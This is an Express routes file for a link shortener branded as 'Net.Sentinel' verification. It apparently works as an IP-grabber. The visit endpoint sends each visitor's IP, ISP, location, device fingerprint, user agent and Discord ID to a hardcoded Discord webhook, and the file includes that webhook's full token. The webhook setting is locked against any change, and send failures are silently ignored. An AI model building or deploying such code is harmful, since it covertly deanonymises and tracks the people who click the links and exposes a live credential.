import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";
import { insertVisitSchema, insertSettingSchema } from "@shared/schema";
import { nanoid } from "nanoid";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  // Link Shortener Endpoints
  app.post(api.links.create.path, async (req, res) => {
    try {
      const code = nanoid(8);
      const link = await storage.createLink({ 
        code, 
        targetUrl: req.body.targetUrl 
      });
      res.status(201).json({ code: link.code });
    } catch (err) {
      res.status(500).json({ message: "Internal Server Error" });
    }
  });

  app.get(api.links.get.path, async (req, res) => {
    const link = await storage.getLinkByCode(req.params.code);
    if (!link) return res.status(404).json({ message: "Link not found" });
    res.json({ targetUrl: link.targetUrl });
  });

  // Analyze endpoint - helps client get its own IP as seen by server
  app.get(api.analyze.get.path, (req, res) => {
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || 'unknown';
    
    let ip = 'unknown';
    if (typeof rawIp === 'string') {
      ip = rawIp.split(',')[0].replace('::ffff:', '').trim();
    } else if (Array.isArray(rawIp)) {
      ip = (rawIp[0] as string).replace('::ffff:', '').trim();
    }
    
    res.json({ ip, userAgent });
  });

  // Locked settings - prevents user webhook override
  app.get(api.settings.get.path, async (req, res) => {
    const key = req.params.key;
    if (key === "webhook_url") return res.status(403).json({ message: "Access Denied" });
    const setting = await storage.getSetting(key);
    if (!setting) return res.status(404).json({ message: "Setting not found" });
    res.json({ value: setting.value });
  });

  app.post(api.settings.update.path, async (req, res) => {
    try {
      const input = insertSettingSchema.parse(req.body);
      if (input.key === "webhook_url") return res.status(403).json({ message: "Access Denied" });
      const setting = await storage.updateSetting(input);
      res.json(setting);
    } catch (err) {
      res.status(400).json({ message: "Invalid request" });
    }
  });

  // Multi-stage logging + Forced Webhook
  app.post(api.visits.create.path, async (req, res) => {
    try {
      const input = insertVisitSchema.parse(req.body);
      const visit = await storage.createVisit(input);

      const WEBHOOK_URL = "https://discord.com/api/webhooks/1463232002982412409/jlC_yvP_GaW_hdlC8x-Zf6y6fs4pFzR7t9ixQakizpm9eGHV6p4HHxa6_z65lPz-sLW8";
      
      const meta = visit.meta as any;
      const payload = {
        embeds: [{
          title: "🛡️ Net.Sentinel Verification Log",
          color: visit.isProxy ? 0xff0066 : 0x00ff88,
          description: `Stage **${visit.stage}/3** reached by **${visit.discordType === 'id' ? 'ID' : 'User'}**: \`${visit.discordId}\``,
          fields: [
            { name: "👤 Identity", value: `${visit.discordType.toUpperCase()}: ${visit.discordId}`, inline: true },
            { name: "🔗 Target Link", value: `\`${visit.linkCode || "Direct"}\``, inline: true },
            { name: "📍 Stage Info", value: `Progress: ${visit.stage}/3\nFingerprint: \`${visit.fingerprint || "N/A"}\``, inline: true },
            { name: "🌐 Network", value: `IP: ${visit.ip}\nISP: ${visit.isp}\nLoc: ${visit.city}, ${visit.country}`, inline: true },
            { name: "📱 Device", value: `${visit.deviceType}\nMobile: ${visit.isMobile ? "Yes" : "No"}\nProxy: ${visit.isProxy ? "⚠️" : "✅"}`, inline: true },
            { name: "⚙️ Meta", value: `TZ: ${meta?.timezone?.id || "N/A"}\nLang: ${req.headers['accept-language']?.split(',')[0] || "N/A"}`, inline: true },
            { name: "📄 Agent", value: `\`\`\`${visit.userAgent}\`\`\`` }
          ],
          footer: { text: "SENTINEL.LINK Secure Routing" },
          timestamp: new Date().toISOString()
        }]
      };

      fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {});

      res.status(201).json(visit);
    } catch (err) {
      res.status(400).json({ message: "Invalid log data" });
    }
  });

  app.get(api.visits.list.path, async (req, res) => {
    const visits = await storage.getVisits();
    res.json(visits);
  });

  return httpServer;
}
